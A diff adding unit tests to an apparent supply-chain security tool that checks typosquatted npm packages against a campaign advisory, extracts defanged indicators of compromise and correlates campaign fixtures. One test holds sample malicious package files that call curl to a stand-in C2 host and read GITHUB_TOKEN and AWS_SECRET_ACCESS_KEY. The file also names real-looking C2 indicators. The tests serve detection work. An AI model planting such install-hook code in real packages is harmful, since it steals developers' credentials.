@@ -1082,6 +1082,115 @@ const https = require("https");
         self.assertEqual(payload["environment_impact"]["status"], "unknown")
         self.assertTrue(any("Block affected versions" in step for step in payload["mitigation"]))
 
+    def test_deadcode_campaign_advisory_matches_reported_packages(self):
+        for package in [
+            "chalk-tempalte",
+            "@deadcode09284814/axios-util",
+            "axois-utils",
+            "color-style-utils",
+        ]:
+            payload = supply_chain.check_advisory("npm", package, "0.0.1")
+            self.assertTrue(payload["matched"], package)
+            self.assertEqual(payload["matches"][0]["campaign_id"], "deadcode09284814-infostealer-botnet-campaign")
+
+    def test_campaign_ioc_extraction_handles_defanged_indicators(self):
+        payload = supply_chain.extract_campaign_iocs([
+            "Credentials were sent to 87e0bbc636999b.lhr[.]life and 80.200.28[.]28:2222.",
+            "Repository description: A Mini Sha1-Hulud has Appeared",
+        ])
+        self.assertIn("87e0bbc636999b.lhr.life", payload["domains"])
+        self.assertIn("80.200.28.28:2222", payload["ip_ports"])
+        self.assertIn("A Mini Sha1-Hulud has Appeared", payload["repository_descriptions"])
+
+    def test_research_campaign_correlates_npm_fixture(self):
+        fixture = REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json"
+        campaign = json.loads(fixture.read_text(encoding="utf-8"))
+        payload = supply_chain.research_campaign(campaign=campaign, dry_run=True, no_fetch=True)
+        self.assertEqual(payload["campaign_id"], "deadcode09284814-infostealer-botnet-campaign")
+        self.assertEqual(len(payload["packages"]), 4)
+        self.assertIn(payload["campaign_verdict"], {"confirmed_true_positive", "likely_true_positive"})
+        self.assertEqual(payload["environment_impact"]["status"], "not_observed")
+        self.assertTrue(any(item["signal"] == "same_publisher" for item in payload["correlations"]))
+        self.assertTrue(any("Shai-Hulud" in item for item in payload["behavioral_indicators"]))
+        chalk = next(item for item in payload["packages"] if item["package"] == "chalk-tempalte")
+        self.assertIn(chalk["package_verdict"], {"confirmed_true_positive", "likely_true_positive"})
+        self.assertIn("87e0bbc636999b.lhr.life", chalk["iocs"]["domains"])
+
+    def test_research_campaign_separates_local_impact_from_package_verdict(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            (root / "package-lock.json").write_text(
+                json.dumps({"packages": {"node_modules/chalk-tempalte": {"version": "0.0.1"}}}),
+                encoding="utf-8",
+            )
+            campaign = json.loads((REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json").read_text(encoding="utf-8"))
+            payload = supply_chain.research_campaign(campaign=campaign, search_root=str(root), dry_run=True, no_fetch=True)
+        chalk = next(item for item in payload["packages"] if item["package"] == "chalk-tempalte")
+        self.assertEqual(chalk["environment_impact"]["status"], "confirmed_affected")
+        self.assertIn(chalk["package_verdict"], {"confirmed_true_positive", "likely_true_positive"})
+
+    def test_research_campaign_can_persist_soc_findings_with_campaign_id(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
+            os.environ["SECOPS_FINDINGS_DIR"] = temp_dir
+            try:
+                campaign = json.loads((REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json").read_text(encoding="utf-8"))
+                payload = supply_chain.research_campaign(campaign=campaign, dry_run=False, persist=True, no_fetch=True)
+            finally:
+                if old_findings_dir is None:
+                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
+                else:
+                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir
+        self.assertTrue(payload["finding_ids"])
+        self.assertTrue(payload["db_path"])
+
+    def test_research_campaign_accepts_cross_ecosystem_packages(self):
+        campaign = {
+            "campaign_id": "unit-cross-ecosystem-campaign",
+            "source_urls": ["https://example.com/report"],
+            "iocs": {"domains": ["c2.example"]},
+            "packages": [
+                {
+                    "ecosystem": "pypi",
+                    "package": "evil_pkg",
+                    "version": "1.0.0",
+                    "files": {"setup.py": "import os, subprocess; subprocess.Popen(['curl','https://c2.example'])"},
+                },
+                {
+                    "ecosystem": "crates",
+                    "package": "evil-crate",
+                    "version": "1.0.0",
+                    "files": {"build.rs": "std::process::Command::new(\"curl\"); std::env::var(\"GITHUB_TOKEN\");"},
+                },
+                {
+                    "ecosystem": "maven",
+                    "package": "com.example:evil",
+                    "version": "1.0.0",
+                    "files": {"src/Main.java": "Runtime.getRuntime().exec(\"curl https://c2.example\"); System.getenv(\"AWS_SECRET_ACCESS_KEY\");"},
+                },
+            ],
+        }
+        payload = supply_chain.research_campaign(campaign=campaign, dry_run=True, no_fetch=True)
+        self.assertEqual(set(payload["ecosystems"]), {"crates", "maven", "pypi"})
+        self.assertEqual(len(payload["packages"]), 3)
+        self.assertTrue(all(item["matched_rules"] for item in payload["packages"]))
+        self.assertIn(payload["campaign_verdict"], {"likely_true_positive", "confirmed_true_positive"})
+
+    def test_cli_research_campaign_outputs_json(self):
+        fixture = REPO_ROOT / "tests" / "fixtures" / "deadcode09284814-campaign.json"
+        stdout = StringIO()
+        with mock.patch("sys.stdout", stdout):
+            exit_code = secopsai_cli.main([
+                "--json",
+                "supply-chain",
+                "research-campaign",
+                "--input",
+                str(fixture),
+                "--dry-run",
+            ])
+        self.assertEqual(exit_code, 0)
+        self.assertIn('"campaign_id": "deadcode09284814-infostealer-botnet-campaign"', stdout.getvalue())
+
     def test_reconcile_history_upgrades_advisory_error(self):
         with tempfile.TemporaryDirectory() as temp_dir:
             temp_path = Path(temp_dir)
